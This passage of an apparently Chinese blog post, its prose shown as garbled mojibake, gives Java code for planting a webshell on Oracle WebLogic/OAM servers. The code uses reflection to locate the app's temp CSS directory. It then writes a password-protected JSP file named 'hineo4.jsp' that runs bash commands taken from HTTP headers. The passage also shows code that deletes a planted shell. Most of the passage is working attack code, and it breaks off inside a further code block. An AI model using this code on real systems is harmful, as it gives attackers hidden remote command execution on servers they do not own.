</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-97-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-97-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-97-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-97-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-97-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-97-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-97-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-97-17>17</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>package</span> pers.neo<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.io.*<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>wjspx</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#a6e22e>wjspx</span><span style=color:#f92672>(){</span>
</span></span><span style=display:flex><span>        String deploydir<span style=color:#f92672>=</span>System<span style=color:#f92672>.</span><span style=color:#a6e22e>getProperty</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;oracle.deployed.app.dir&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        loop<span style=color:#f92672>(</span><span style=color:#66d9ef>new</span> File<span style=color:#f92672>(</span>deploydir<span style=color:#f92672>));</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>loop</span><span style=color:#f92672>(</span>File dir<span style=color:#f92672>){</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span><span style=color:#f92672>(</span>File file<span style=color:#f92672>:</span>dir<span style=color:#f92672>.</span><span style=color:#a6e22e>listFiles</span><span style=color:#f92672>()){</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span><span style=color:#f92672>(</span>file<span style=color:#f92672>.</span><span style=color:#a6e22e>isFile</span><span style=color:#f92672>()){</span>
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>if</span><span style=color:#f92672>(</span>file<span style=color:#f92672>.</span><span style=color:#a6e22e>getAbsolutePath</span><span style=color:#f92672>().</span><span style=color:#a6e22e>endsWith</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;/war/pages/css/hineo2.jsp&#34;</span><span style=color:#f92672>)){</span>file<span style=color:#f92672>.</span><span style=color:#a6e22e>delete</span><span style=color:#f92672>();}</span>
</span></span><span style=display:flex><span>            <span style=color:#f92672>}</span><span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span><span style=color:#f92672>(</span>file<span style=color:#f92672>.</span><span style=color:#a6e22e>isDirectory</span><span style=color:#f92672>()){</span>
</span></span><span style=display:flex><span>                loop<span style=color:#f92672>(</span>file<span style=color:#f92672>.</span><span style=color:#a6e22e>getAbsoluteFile</span><span style=color:#f92672>());</span>
</span></span><span style=display:flex><span>            <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=wjsp2javaç²¾å‡†å®šä½ä¸´æ—¶ç›®å½•å†™jspæœ¨é©¬>wjsp2.javaï¼šç²¾å‡†å®šä½ä¸´æ—¶ç›®å½•å†™jspæœ¨é©¬<a hidden class=anchor aria-hidden=true href=#wjsp2javaç²¾å‡†å®šä½ä¸´æ—¶ç›®å½•å†™jspæœ¨é©¬>#</a></h2><h3 id=æ¢ç´¢è¿‡ç¨‹-1>æ¢ç´¢è¿‡ç¨‹<a hidden class=anchor aria-hidden=true href=#æ¢ç´¢è¿‡ç¨‹-1>#</a></h3><p>åœ¨æ¢ç´¢å®ç° wjsp.java æ—¶æˆ‘ä»¬æåˆ°ï¼Œè¿˜æœ‰ <code>oam_server/xrd2uw/</code> è¿™ä¸€æ®µè·¯å¾„æ˜¯æœªçŸ¥çš„ã€‚</p><p>åœ¨å­¦ä¹ ç¼–å†™å†…å­˜é©¬çš„è¿‡ç¨‹ä¸­æˆ‘å‘ç°é€šè¿‡å½“å‰è¯·æ±‚çš„ä¸Šä¸‹æ–‡å¯ä»¥å¾—åˆ°è¿™ä¸€æ®µè·¯å¾„ã€‚é‚£ä¹ˆæ‹¼æ¥èµ·æ¥å°±å¯ä»¥å¾—åˆ°å®Œæ•´çš„cssè·¯å¾„ï¼Œç²¾å‡†å†™å…¥ç›®æ ‡æ–‡ä»¶å¤¹äº†ã€‚</p><p><img loading=lazy src=image-20220701152336737.png alt=image-20220701152336737></p><p><img loading=lazy src=image-20220701152411195.png alt=image-20220701152411195></p><p>å¯ä»¥é€šè¿‡ <code>getTempPath()</code> ç²¾å‡†å®šä½åˆ°ä¸´æ—¶ç›®å½•çš„ä½ç½®æ˜¯ <code>oam_server/xrd2uw</code></p><p>åŠ ä¸Š<code>System.getProperty("oracle.deployed.app.dir")</code> è·å–åˆ°çš„ <code>"/u01/oracle/user_projects/domains/access_domain/servers/oam_server1/tmp/_WL_user"</code></p><p>æ‹¼æ¥èµ·æ¥ï¼Œå°±èƒ½ç²¾å‡†å¾—åˆ°è·¯å¾„ <code>"/u01/oracle/user_projects/domains/access_domain/servers/oam_server1/tmp/_WL_user/oam_server/xrd2uw/war/pages/css"</code></p><p>éå¸¸å®Œç¾ï¼Œé¿å…äº†wjsp.javaé‡Œé¢é‚£ç§ä¸ä¼˜é›…çš„åˆ°å¤„å†™jspçš„æ–¹æ³•ã€‚</p><h3 id=ä¼˜ç¼ºç‚¹-2>ä¼˜ç¼ºç‚¹<a hidden class=anchor aria-hidden=true href=#ä¼˜ç¼ºç‚¹-2>#</a></h3><p>ä¼˜ç‚¹</p><ol><li>å¯ä»¥ç²¾å‡†å¾€æƒ³è¦çš„æœªçŸ¥å†™å…¥jspæ–‡ä»¶ï¼Œé¿å…äº†å› ä¸ºéƒ¨ç½²å·®å¼‚å¯¼è‡´å¤±è´¥</li></ol><p>ç¼ºç‚¹</p><ol start=2><li>å­˜åœ¨ç¯å¢ƒä¸ç¡®å®šæ€§ï¼Œå¯èƒ½å› ä¸ºä¸åŒç‰ˆæœ¬ä»£ç å†™æ³•ä¸åŒå¯¼è‡´è·å–ä¸åˆ°requestå¯¹è±¡</li></ol><h3 id=æœ€ç»ˆæ•ˆæœ-3>æœ€ç»ˆæ•ˆæœ<a hidden class=anchor aria-hidden=true href=#æœ€ç»ˆæ•ˆæœ-3>#</a></h3><p><img loading=lazy src=image-20220701155401195.png alt=image-20220701155401195></p><p><img loading=lazy src=image-20220701155347316.png alt=image-20220701155347316></p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-98-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-98-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-98-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-98-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-98-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-98-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-98-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-98-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-98-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-98-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-98-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-98-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-98-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-98-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-98-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-98-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-98-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-98-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-98-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-98-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-98-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-98-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-98-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-98-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-98-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-98-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-98-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-98-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-98-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-98-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-98-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-98-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-98-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-98-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-98-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-98-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-98-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-98-19>19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-98-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-98-20>20</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-98-21><a style=outline:none;text-decoration:none;color:inherit href=#hl-98-21>21</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-98-22><a style=outline:none;text-decoration:none;color:inherit href=#hl-98-22>22</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-98-23><a style=outline:none;text-decoration:none;color:inherit href=#hl-98-23>23</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-98-24><a style=outline:none;text-decoration:none;color:inherit href=#hl-98-24>24</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-98-25><a style=outline:none;text-decoration:none;color:inherit href=#hl-98-25>25</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-98-26><a style=outline:none;text-decoration:none;color:inherit href=#hl-98-26>26</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-98-27><a style=outline:none;text-decoration:none;color:inherit href=#hl-98-27>27</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-98-28><a style=outline:none;text-decoration:none;color:inherit href=#hl-98-28>28</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-98-29><a style=outline:none;text-decoration:none;color:inherit href=#hl-98-29>29</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-98-30><a style=outline:none;text-decoration:none;color:inherit href=#hl-98-30>30</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-98-31><a style=outline:none;text-decoration:none;color:inherit href=#hl-98-31>31</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-98-32><a style=outline:none;text-decoration:none;color:inherit href=#hl-98-32>32</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-98-33><a style=outline:none;text-decoration:none;color:inherit href=#hl-98-33>33</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-98-34><a style=outline:none;text-decoration:none;color:inherit href=#hl-98-34>34</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-98-35><a style=outline:none;text-decoration:none;color:inherit href=#hl-98-35>35</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-98-36><a style=outline:none;text-decoration:none;color:inherit href=#hl-98-36>36</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-98-37><a style=outline:none;text-decoration:none;color:inherit href=#hl-98-37>37</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-98-38><a style=outline:none;text-decoration:none;color:inherit href=#hl-98-38>38</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-98-39><a style=outline:none;text-decoration:none;color:inherit href=#hl-98-39>39</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-98-40><a style=outline:none;text-decoration:none;color:inherit href=#hl-98-40>40</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>package</span> pers.neo<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> weblogic.servlet.internal.HttpConnectionHandler<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> weblogic.servlet.provider.ContainerSupportProviderImpl<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> weblogic.work.ExecuteThread<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.io.*<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>wjsp2</span><span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#a6e22e>wjsp2</span><span style=color:#f92672>(){</span>
</span></span><span style=display:flex><span>        String deploydir<span style=color:#f92672>=</span>System<span style=color:#f92672>.</span><span style=color:#a6e22e>getProperty</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;oracle.deployed.app.dir&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        java<span style=color:#f92672>.</span><span style=color:#a6e22e>lang</span><span style=color:#f92672>.</span><span style=color:#a6e22e>reflect</span><span style=color:#f92672>.</span><span style=color:#a6e22e>Field</span> field <span style=color:#f92672>=</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>        HttpConnectionHandler httpConn <span style=color:#f92672>=</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            ContainerSupportProviderImpl<span style=color:#f92672>.</span><span style=color:#a6e22e>WlsRequestExecutor</span> gcw <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>ContainerSupportProviderImpl<span style=color:#f92672>.</span><span style=color:#a6e22e>WlsRequestExecutor</span><span style=color:#f92672>)</span> <span style=color:#f92672>((</span>ExecuteThread<span style=color:#f92672>)</span> Thread<span style=color:#f92672>.</span><span style=color:#a6e22e>currentThread</span><span style=color:#f92672>()).</span><span style=color:#a6e22e>getCurrentWork</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>            field <span style=color:#f92672>=</span> gcw<span style=color:#f92672>.</span><span style=color:#a6e22e>getClass</span><span style=color:#f92672>().</span><span style=color:#a6e22e>getDeclaredField</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;connectionHandler&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            field<span style=color:#f92672>.</span><span style=color:#a6e22e>setAccessible</span><span style=color:#f92672>(</span><span style=color:#66d9ef>true</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            httpConn <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>HttpConnectionHandler<span style=color:#f92672>)</span> field<span style=color:#f92672>.</span><span style=color:#a6e22e>get</span><span style=color:#f92672>(</span>gcw<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            String temppath <span style=color:#f92672>=</span> httpConn<span style=color:#f92672>.</span><span style=color:#a6e22e>getServletRequest</span><span style=color:#f92672>().</span><span style=color:#a6e22e>getContext</span><span style=color:#f92672>().</span><span style=color:#a6e22e>getTempPath</span><span style=color:#f92672>().</span><span style=color:#a6e22e>toString</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>            File csspath<span style=color:#f92672>=</span><span style=color:#66d9ef>new</span> File<span style=color:#f92672>(</span><span style=color:#66d9ef>new</span> File<span style=color:#f92672>(</span>deploydir<span style=color:#f92672>,</span>temppath<span style=color:#f92672>),</span><span style=color:#e6db74>&#34;war/pages/css/login_page.css&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            w<span style=color:#f92672>(</span>csspath<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span> <span style=color:#66d9ef>catch</span> <span style=color:#f92672>(</span>Exception e<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> RuntimeException<span style=color:#f92672>(</span>e<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>w</span><span style=color:#f92672>(</span>File file<span style=color:#f92672>){</span>
</span></span><span style=display:flex><span>        File fjsp<span style=color:#f92672>=</span><span style=color:#66d9ef>new</span> File<span style=color:#f92672>(</span>file<span style=color:#f92672>.</span><span style=color:#a6e22e>getParent</span><span style=color:#f92672>(),</span><span style=color:#e6db74>&#34;hineo4.jsp&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        PrintWriter writer <span style=color:#f92672>=</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            writer <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> PrintWriter<span style=color:#f92672>(</span>fjsp<span style=color:#f92672>.</span><span style=color:#a6e22e>getAbsoluteFile</span><span style=color:#f92672>(),</span> <span style=color:#e6db74>&#34;UTF-8&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span> <span style=color:#66d9ef>catch</span> <span style=color:#f92672>(</span>Exception e<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> RuntimeException<span style=color:#f92672>(</span>e<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>        String jsp<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;&lt;% if(\&#34;p4ssw0rd!\&#34;.equals(request.getHeader(\&#34;x-forwarded-fur\&#34;))){ java.io.InputStream in = Runtime.getRuntime().exec(new String[]{\&#34;bash\&#34;,\&#34;-c\&#34;,request.getHeader(\&#34;x-forwarded-far\&#34;)}).getInputStream(); int a = -1; byte[] b = new byte[2048]; out.print(\&#34;&lt;pre&gt;\&#34;); while((a=in.read(b))!=-1){ out.println(new String(b)); } out.print(\&#34;&lt;/pre&gt;\&#34;); } %&gt;&#34;</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>        writer<span style=color:#f92672>.</span><span style=color:#a6e22e>println</span><span style=color:#f92672>(</span>jsp<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        writer<span style=color:#f92672>.</span><span style=color:#a6e22e>close</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=wjsp2xjavaç²¾å‡†å®šä½ä¸´æ—¶ç›®å½•å¸è½½jspæœ¨é©¬>wjsp2x.javaï¼šç²¾å‡†å®šä½ä¸´æ—¶ç›®å½•å¸è½½jspæœ¨é©¬<a hidden class=anchor aria-hidden=true href=#wjsp2xjavaç²¾å‡†å®šä½ä¸´æ—¶ç›®å½•å¸è½½jspæœ¨é©¬>#</a></h2><h3 id=æ³¨æ„ç‚¹-1>æ³¨æ„ç‚¹<a hidden class=anchor aria-hidden=true href=#æ³¨æ„ç‚¹-1>#</a></h3><p>å¯ä»¥æ¨¡æ‹Ÿwjsp2.javaçš„åšæ³•åˆ é™¤ç£ç›˜ä¸Šçš„æ–‡ä»¶ï¼Œä½†éœ€è¦æ³¨æ„ï¼š</p><ol><li>å¦‚æœåœ¨åˆ é™¤æ–‡ä»¶å‰è®¿é—®è¿‡webshellï¼Œjspæ–‡ä»¶å°±å·²ç»è½¬æˆclassï¼Œè·¯ç”±ä¹Ÿæ·»åŠ äº†ã€‚é‚£ä¹ˆåœ¨åˆ é™¤æ–‡ä»¶åªæ˜¯ä»ç£ç›˜ä¸Šé¢åˆ é™¤jspè€Œå·²ï¼Œåé—¨è¿˜æ˜¯å¯ä»¥è®¿é—®çš„ã€‚</li><li>é‡æ–°ä¸Šä¼ åŒåä½†æ˜¯å†…å®¹ä¸åŒçš„jspæ–‡ä»¶ï¼Œå¹¶ä¸ä¼šå†ç¼–è¯‘ä¸€æ¬¡å»è¦†ç›–å·²æœ‰çš„classï¼Œä¹Ÿå°±æ˜¯è¯´æ— æ³•æ›´æ–°webshellçš„åŠŸèƒ½æˆ–è€…å¯†ç ã€‚</li></ol><h3 id=æœ€ç»ˆæ•ˆæœ-4>æœ€ç»ˆæ•ˆæœ<a hidden class=anchor aria-hidden=true href=#æœ€ç»ˆæ•ˆæœ-4>#</a></h3><p><img loading=lazy src=image-20220701160636961.png alt=image-20220701160636961></p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-99-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-99-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-99-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-99-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-99-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-99-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-99-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-99-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-99-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-99-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-99-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-99-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-99-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-99-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-99-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-99-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-99-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-99-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-99-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-99-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-99-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-99-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-99-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-99-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-99-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-99-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-99-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-99-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-99-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-99-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-99-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-99-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-99-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-99-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-99-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-99-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-99-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-99-19>19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-99-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-99-20>20</a>
